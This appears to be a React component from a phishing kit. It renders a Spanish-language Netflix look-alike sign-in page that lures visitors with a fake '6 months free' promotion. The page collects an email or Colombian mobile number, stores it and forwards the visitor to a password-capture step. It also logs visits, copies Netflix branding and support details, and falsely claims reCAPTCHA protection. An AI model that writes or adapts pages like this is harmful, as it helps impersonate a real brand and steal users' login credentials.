/**
 * Promo Login - White Netflix style for the promo flow
 * After login, redirects to promo password
 */

import PageTransition from "@/components/PageTransition";
import { ChevronDown } from "lucide-react";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";

export default function PromoLogin() {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();

  useEffect(() => {
    fetch("/api/track/visit", { method: "POST" }).catch(() => {});
  }, []);

  const validateEmail = () => {
    const value = email.trim();
    if (!value) {
      setError("Ingresa un email o un número de celular válido.");
      return false;
    }
    if (value.includes("@")) {
      if (!value.includes(".")) {
        setError("Ingresa un email válido.");
        return false;
      }
      setError("");
      return true;
    }
    const digits = value.replace(/\D/g, "");
    if (digits.length > 0) {
      if (!digits.startsWith("3") || digits.length !== 10) {
        setError("El número de celular debe iniciar con 3 y tener 10 dígitos.");
        return false;
      }
      setError("");
      return true;
    }
    setError("Ingresa un email o un número de celular válido.");
    return false;
  };

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateEmail()) return;

    setIsLoading(true);
    sessionStorage.setItem("userEmail", email);
    sessionStorage.setItem("sp_email", email);
    setTimeout(() => {
      setIsLoading(false);
      setLocation("/promo-password");
    }, 1000);
  };

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-white flex flex-col">
        {/* Header */}
        <header className="w-full px-4 sm:px-8 lg:px-12 py-4 flex items-center justify-between border-b border-[#e6e6e6]">
          <BrandLogo height={22} />
          <span className="text-[#333] text-[14px] font-medium cursor-pointer hover:underline">
            Cerrar sesión
          </span>
        </header>

        {/* Progress bar */}
        <div className="w-full h-[3px] bg-[#e6e6e6]">
          <div className="h-full bg-[#E50914]" style={{ width: '50%' }} />
        </div>

        {/* Main Content */}
        <main className="flex-1 flex flex-col items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
          <div className="w-full max-w-[440px]">
            {/* Title */}
            <h1 className="text-[26px] sm:text-[32px] font-bold text-[#141414] mb-3 leading-[1.1]">
              Inicia sesión
            </h1>

            {/* Subtitle */}
            <p className="text-[16px] text-[#333] mb-6 leading-relaxed">
              Ingresa tu email o número de celular para aplicar tu promoción de 6 meses gratis.
            </p>

            {/* Form */}
            <form onSubmit={handleContinue} className="space-y-4">
              <div>
                <input
                  type="text"
                  placeholder="Email o número de celular"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (error) setError("");
                  }}
                  className={`w-full h-[56px] px-4 rounded-[4px] text-[#141414] placeholder:text-[#737373] text-[16px] outline-none transition-colors border ${
                    error ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-[#141414]"
                  }`}
                />
                {error && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{error}</p>
                  </div>
                )}
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full h-[56px] bg-[#E50914] text-white text-[18px] sm:text-[22px] font-medium rounded-[4px] hover:bg-[#c11119] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
              >
                {isLoading ? "Continuando..." : "Continuar"}
              </button>
            </form>

            {/* Help Section */}
            <div className="mt-6">
              <button className="flex items-center gap-1 text-[#333] text-[15px] hover:text-[#141414] transition-colors">
                <span>Obtener ayuda</span>
                <ChevronDown size={18} />
              </button>
            </div>

            <p className="text-[#737373] text-[13px] mt-6 leading-relaxed">
              Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
            </p>
          </div>
        </main>

        {/* Footer */}
        <footer className="w-full bg-[#f3f3f3] px-4 sm:px-8 lg:px-12 py-6 mt-auto">
          <p className="text-[#737373] text-[13px] mb-4">
            ¿Preguntas? Llama al 01 800 519 1570 (sin cargo)
          </p>
          <div className="grid grid-cols-2 gap-2 text-[13px]">
            <a href="#" className="text-[#737373] underline">Preguntas frecuentes</a>
            <a href="#" className="text-[#737373] underline">Centro de ayuda</a>
            <a href="#" className="text-[#737373] underline">Términos de uso</a>
            <a href="#" className="text-[#737373] underline">Privacidad</a>
            <a href="#" className="text-[#737373] underline">Preferencias de cookies</a>
            <a href="#" className="text-[#737373] underline">Información empresarial</a>
          </div>
        </footer>
      </div>
    </PageTransition>
  );
}
